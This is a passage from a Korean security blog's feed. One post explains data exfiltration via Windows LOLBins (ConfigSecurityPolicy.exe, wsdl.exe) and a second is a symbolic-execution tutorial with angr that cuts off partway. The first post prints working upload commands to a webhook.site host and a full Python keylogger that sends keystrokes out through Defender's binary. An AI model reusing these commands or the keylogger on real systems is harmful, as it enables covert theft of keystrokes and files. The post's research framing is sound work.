  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Data Exfiltration with LOLBins</title>
    <link href="/2021/07/22/idioth/2021-07-22/"/>
    <url>/2021/07/22/idioth/2021-07-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf">Data Exfiltration with LOLBins</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Living off the land (LOL)&#xC740; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBBF8;&#xB9AC; &#xC124;&#xCE58;&#xB41C; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC804;&#xD30C;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. LOL&#xC5D0;&#xB294; Windows &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC228;&#xAE30;&#xB294; LOLBins, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; LOLLibs, &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; LOLScripts &#xB4F1;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xC220;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. LOL&#xC5D0; &#xAD00;&#xD55C; &#xB9CE;&#xC740; &#xD2B8;&#xB9AD;&#xB4E4;&#xC740; <a href="https://lolbas-project.github.io/">LOLBAS &#xD504;&#xB85C;&#xC81D;&#xD2B8;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Microsoft Windows Defender&#xC758; <code>ConfigSecurityPolicy.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs subunit">ConfigSecurityPolicy.exe C:\temp\config.xml &quot;https://webhook.site/4bce19be<span class="hljs-string">-2642</span><span class="hljs-string">-4</span>f76<span class="hljs-string">-9</span>e8e<span class="hljs-string">-7</span>aea1448322d?sensitive_data&quot;</code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>webhook.site</code>&#xC5D0; <code>C:\temp\config.xml</code> &#xD30C;&#xC77C;&#xC774; <code>sensitive_data</code> &#xD30C;&#xC77C;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD6C4; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; .NET Framework development environment&#xC5D0;&#xC11C; &#xC6F9; &#xC11C;&#xBC84; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; Microsoft Web Services Description Language Utility&#xC778; <code>wsdl.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">wsdl</span>.exe /server ttps://webhook.site/<span class="hljs-number">4</span>bce<span class="hljs-number">19</span>be-<span class="hljs-number">2642</span>-<span class="hljs-number">4</span>f<span class="hljs-number">76</span>-<span class="hljs-number">9</span>e<span class="hljs-number">8</span>e-<span class="hljs-number">7</span>aea<span class="hljs-number">1448322</span>d?sensitive_data</code></pre><p>&#xD574;&#xB2F9; LOLBins&#xB97C; &#xD1B5;&#xD574; Windows defender&#xC758; &#xB85C;&#xADF8;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xD0A4;&#xB85C;&#xAE45;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-comment"># From: https://github.com/moses-palmer/pynput</span>from pynput.keyboard import Key, Listenerimport osimport sysimport subprocessURL = <span class="hljs-string">&apos;https://webhook.site/xxxxxx-xxxxx-xxxx-xxxxx-xxxxxxx&apos;</span>uploader = <span class="hljs-string">&quot;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe&quot;</span>content = <span class="hljs-string">&quot;&quot;</span>def on_press(key):    global content    global URL    global uploader    <span class="hljs-keyword">if</span> str(key) == <span class="hljs-string">&apos;Key.backspace&apos;</span>:        content += <span class="hljs-string">&apos; &apos;</span>    <span class="hljs-keyword">else</span>:        content += str(key)print(f<span class="hljs-string">&apos;last key: {str(key)}&apos;</span>)    print(<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-keyword">if</span> str(key) == <span class="hljs-string">&apos;Key.enter&apos;</span>:        upload_url = (f<span class="hljs-string">&apos;{URL}?{content}&apos;</span>)        subprocess.call([uploader, <span class="hljs-string">&apos;c:\\temp\\test.xml&apos;</span>, upload_url])        buffer = <span class="hljs-string">&apos;&apos;</span><span class="hljs-keyword">if</span> key == <span class="hljs-number">0</span>x03:        sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    try:        with Listener(on_press=on_press) as listener:            listener.join()    except (KeyboardInterrupt, SystemExit):        sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>lolbins</tag>
      
      <tag>data exfiltration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 핵린이의 angr 정복기 - (2) Symbolic Execution</title>
    <link href="/2021/07/21/j0ker/angr_part2/"/>
    <url>/2021/07/21/j0ker/angr_part2/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-2-Symbolic-Execution"><a href="#&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-2-Symbolic-Execution" class="headerlink" title="&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution"></a>&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</h1><p><img src="/2021/07/21/j0ker/angr_part2/5gxdyj.jpg" alt="./angr_part2/5gxdyj.jpg"></p><h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;&#x2026; &#xC800;&#xBC88;&#xC8FC;&#xBD80;&#xD130; &#xB0A0;&#xC528;&#xAC00; &#xC88B;&#xB124;&#xC694;&#x2026; &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xB294; &#xC9D1;&#xC5D0;&#xB9CC; &#xCCD0;&#xBC15;&#xD600;&#xC11C; &#xC77C;&#xC774;&#xB791; &#xACF5;&#xBD80;&#xB9CC; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#xD558;&#xD558; &#xC65C;&#xB0D0;&#xACE0;&#xC694;? &#xC4F8;&#xB370;&#xC5C6;&#xC774; &#xC8FC;&#xC81C;&#xB97C; &#xC5B4;&#xB835;&#xAC8C; &#xC7A1;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;! </p><p><img src="/2021/07/21/j0ker/angr_part2/joker_sad_by_darknight7_d1hjnno-fullview.jpeg" alt="./angr_part2/joker_sad_by_darknight7_d1hjnno-fullview.jpeg"></p><blockquote><p>&#xCB48;&#xAD74;&#x2026;</p></blockquote><p>&#xC0AC;&#xC2E4; &#xC8FC;&#xC81C;&#xB294; &#xC798;&#xBABB;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xBABB;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB807;&#xAC8C; &#xACE0;&#xD1B5;&#xBC1B;&#xB294; &#xAC83;&#xC774;&#xC8E0;. &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#x201C;&#xC74C;&#x2026; &#xADF8;&#xB0E5; Symbolic Execution&#xB9CC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xACF5;&#xBD80;&#xD574;&#xC11C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xC9C0;?&#x201D;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD55C;&#xAC8C; &#xAC00;&#xC7A5; &#xD070; &#xC624;&#xC0B0;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xB2E4;&#xBCF4;&#xB2C8; &#xB2E4;&#xB978; &#xAC83;&#xB3C4; &#xACF5;&#xBD80;&#xD574;&#xC57C;&#xD558;&#xACE0; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xBCF4;&#xB2C8; &#xBAA8;&#xB974;&#xB294;&#xAC8C; &#xB9CE;&#xACE0; &#xAD81;&#xAE08;&#xD55C; &#xAC83;&#xB3C4; &#xB9CE;&#xC774; &#xC0DD;&#xAE30;&#xACE0;&#x2026; &#xC774;&#xAC83;&#xC800;&#xAC83; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xBCF4;&#xB2C8; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xACF5;&#xBD80;&#xD560; &#xC591;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC2DC;&#xAC04;&#xC774; &#xC624;&#xB798;&#xAC78;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xB2C9;&#xB124;&#xC784;&#xC744; &#xACE0;&#xCEE4;(&#xACE0;&#xD1B5;&#xBC1B;&#xB294; &#xC870;&#xCEE4;)&#xB85C; &#xBC14;&#xAFD4;&#xC57C;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC544;&#xBB34;&#xD2BC; &#xC774;&#xC81C; Symbolic Execution&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="&#xC790;&#xB3D9;-&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;-&#xBD84;&#xC11D;-&#xAE30;&#xBC95;"><a href="#&#xC790;&#xB3D9;-&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;-&#xBD84;&#xC11D;-&#xAE30;&#xBC95;" class="headerlink" title="&#xC790;&#xB3D9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D; &#xAE30;&#xBC95;"></a>&#xC790;&#xB3D9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D; &#xAE30;&#xBC95;</h1><p>Symbolic Execution&#xC740; &#xC790;&#xB3D9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D; &#xAE30;&#xBC95; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xD0C0;&#xAC9F; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC744; &#xC9C0;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544;&#xC8FC;&#xB294;&#xAC70;&#xC8E0;. &#xC790;&#xB3D9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC740; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xACFC; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xB450; &#xAC00;&#xC9C0;&#xACE0; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. &#xC0AC;&#xB78C;&#xC774; &#xBD84;&#xC11D;&#xD560; &#xB54C;&#xB3C4; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xACFC; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC8E0;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, CTF&#xC5D0;&#xC11C; Pwnable &#xBB38;&#xC81C;&#xAC00; &#xB098;&#xC624;&#xBA74; &#xBA3C;&#xC800; IDA&#xC5D0; &#xB123;&#xC5B4;&#xC11C; &#xC5B4;&#xC148;&#xBE14;&#xB9AC; &#xCF54;&#xB4DC;&#xB97C; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xD55C; &#xB2E4;&#xC74C;, &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xD558;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xAC8C; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xBC18;&#xB300;&#xB85C;, &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD574;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC774;&#xACA0;&#xC8E0;? IDA&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xC744; &#xC644;&#xB8CC;&#xD558;&#xBA74; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; Exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC138;&#xC6B4; &#xD6C4;, &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xBA74;&#xC11C; &#xC608;&#xC0C1;&#xB300;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xBC14;&#xB00C;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C; &#xB2E4;&#xC74C; Exploit&#xC744; &#xC9C4;&#xD589;&#xD558;&#xACA0;&#xC8E0;. &#xC774;&#xAC8C; &#xC2E4;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xB3D9;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xB7EC;&#xBD84;&#xC740; &#xCDE8;&#xC57D;&#xC810; &#xC790;&#xB3D9; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC5B4;&#xB5A4; &#xD0A4;&#xC6CC;&#xB4DC;&#xB4E4;&#xC774; &#xB5A0;&#xC624;&#xB974;&#xC2DC;&#xB098;&#xC694;? &#xB9CE;&#xC740; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xC544;&#xC2DC;&#xAC70;&#xB098; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xB4E4;&#xC744; &#xB098;&#xC5F4;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Fuzzing : &#xD0C0;&#xAC9F; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xB79C;&#xB364;&#xD55C; &#xAC12;&#xC744; &#xC785;&#xB825;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAE30;&#xBC95;</li><li>Taint Anaysis : &#xD2B9;&#xC815; &#xAC12;&#xC744; &#xC785;&#xB825;&#xD558;&#xACE0; &#xC785;&#xB825;&#xD55C; &#xAC12;&#xC774; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xAC70;&#xCE58;&#xBA74;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB098; &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;&#xC5D0; &#xC5B4;&#xB5A4; &#xBCC0;&#xD654;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC9C0; &#xCD94;&#xC801;&#xD558;&#xB294; &#xAE30;&#xBC95;</li><li>Dynamic Binary Instrumentation : &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAE30;&#xBC95;</li></ul><p>&#xCD5C;&#xADFC;&#xC5D0;&#xB294; &#xC774;&#xB7F0; &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC4F0;&#xC774;&#xAE30; &#xBCF4;&#xB2E4;&#xB294; &#xC11C;&#xB85C;&#xC758; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xBA74;&#xC11C; &#xBCF5;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xC4F0;&#xC774;&#xACE0; &#xC788;&#xB294;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC;&#xC5D0; <a href="https://hackyboiz.github.io/tags/Fabu1ous/">Fabulous</a>&#xB2D8;&#xC774; &#xD3EC;&#xC2A4;&#xD305;&#xD55C; <a href="https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/">WinAFL&#xB85C; &#xB9C8;&#xAD6C; &#xD37C;&#xC9D5;&#xD558;&#xAE30; &#xC2DC;&#xB9AC;&#xC988;</a>&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xACE0; &#xC788;&#xB294; WinAFL&#xB3C4; Fuzzing+Dynamic Binary Instrumentation&#xC744; &#xACB0;&#xD569;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC8E0;.</p><p>&#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD55C; &#xAE30;&#xBC95;&#xB4E4;&#xC758; &#xACF5;&#xD1B5;&#xC810;&#xC740; &#xBB34;&#xC5C7;&#xC77C;&#xAE4C;&#xC694;? &#xBAA8;&#xB450; &#xB3D9;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC774;&#xB77C;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74;&#xC5D0; Symbolic Execution&#xC740; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/21/j0ker/angr_part2/5gy87e.jpg" alt="./angr_part2/5gy87e.jpg"></p><p>&#xC544;&#xB2C8;&#x2026; &#xC774;&#xB984;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#x201C;Execution&#x201D;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xC788;&#xACE0;, &#xBA54;&#xBAA8;&#xB9AC;&#xB791; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC14;&#xB00C;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xAC00;&#xBA74;&#xC11C; &#xD558;&#xB294;&#xAC70; &#xC544;&#xB0D0;? &#xB77C;&#xACE0; &#xC800;&#xB294; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB7FC; &#xC774;&#xC81C; Symbolic Execution&#xC758; &#xAC1C;&#xB150;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xBA74;&#xC11C; &#xC65C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC778;&#xC9C0;&#xB3C4; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Symbolic-Execution"><a href="#Symbolic-Execution" class="headerlink" title="Symbolic Execution"></a>Symbolic Execution</h1><p>Symbolic Execution&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xD0C0;&#xAC9F; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xD48B;&#xAC12;&#xC744; &#xBBF8;&#xC9C0;&#xC218;&#xB85C; &#xAC00;&#xC815;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC2EC;&#xBCFC;&#xD654;(&#xAE30;&#xD638;&#xD654;)&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBAA8;&#xB4E0; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xACBD;&#xB85C;&#xB9C8;&#xB2E4; &#xC774; &#xACBD;&#xB85C;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC778;&#xD48B;&#xAC12;&#xC774; &#xBB50;&#xAC00; &#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xC218;&#xC2DD;&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xBC84;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBC1C;&#xACAC;&#xD55C;&#xB2E4;&#xBA74; &#xD574;&#xB2F9; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC774;&#xC81C;&#xAE4C;&#xC9C0; &#xB9CC;&#xB4E0; &#xC218;&#xC2DD;&#xC744; &#xD480;&#xC5B4; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xC778;&#xD48B;&#xAC12;&#xC744; &#xB123;&#xC5B4;&#xC57C;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB835;&#xC8E0;&#x2026; &#xC774;&#xAC8C; &#xBB54; &#xC18C;&#xB9B0;&#xC9C0;&#x2026;</p><p>&#xC608;&#xC2DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xB2E4;&#xC2DC; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foobar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>{ <span class="hljs-keyword">int</span> x = <span class="hljs-number">1</span>, y = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> (a != <span class="hljs-number">0</span>) {y = <span class="hljs-number">3</span>+x;<span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>)x = <span class="hljs-number">2</span>*(a+b);}assert(x-y != <span class="hljs-number">0</span>); }</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; foobar&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC778;&#xD48B;&#xC740; a&#xC640; b&#xAC00; &#xC788;&#xACE0; assert &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC885;&#xB8CC;&#xC2DC;&#xD0A4;&#xB294; a&#xC640; b&#xB97C; &#xCC3E;&#xC73C;&#xB824;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C;&#xD560;&#xAE4C;&#xC694;? &#xBCF4;&#xBA74; x&#xB294; 1&#xB85C; y&#xB294; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB97C; &#xD558;&#xB294;&#xB370;, x-y&#xAC00; 0&#xC774; &#xB418;&#xC5B4;&#xC57C;&#xD558;&#xB2C8;&#xAE4C; if &#xBB38; &#xC548;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; x&#xC640; y&#xC758; &#xAC12;&#xC744; &#xC870;&#xC808;&#xD574;&#xC57C;&#xD560; &#xAC70; &#xAC19;&#xB124;&#xC694;. if&#xBB38;&#xC744; &#xBCF4;&#xBA74; &#xC77C;&#xB2E8; a&#xAC00; 0&#xC774; &#xC544;&#xB2C8;&#xC5EC;&#xC57C; if&#xBB38; &#xC548;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC08; &#xC218; &#xC788;&#xC744;&#xAC70; &#xAC19;&#xAD6C;&#xC694;. &#xADF8;&#xB7EC;&#xBA74; y&#xB294; x+3=4&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; x&#xC640; y&#xAC00; &#xAC19;&#xC544;&#xC57C; &#xD558;&#xB2C8;&#xAE4C; &#xB450;&#xBC88;&#xC9F8; if&#xBB38; &#xC548;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; x&#xAC00; 4&#xAC00; &#xB420; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD574;&#xC57C;&#xACA0;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; b&#xAC00; 0&#xC774;&#xC5B4;&#xC57C; &#xD558;&#xACE0; 2 * (a+b)&#xAC00; 4&#xAC00; &#xB418;&#xC5B4;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xD1A0;&#xB300;&#xB85C; &#xC870;&#xAC74;&#xB4E4;&#xC744; &#xB098;&#xC5F4;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><script type="math/tex; mode=display">a\ne0</script></li><li><script type="math/tex; mode=display">0=2*(a+b)-4</script></li><li><script type="math/tex; mode=display">b=0</script></li></ol><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774; &#xC870;&#xAC74;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xB9CC;&#xC871;&#xD574;&#xC57C;&#xD558;&#xB2C8;&#xAE4C; &#xD569;&#xCE58;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC218;&#xC2DD;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;.</p><script type="math/tex; 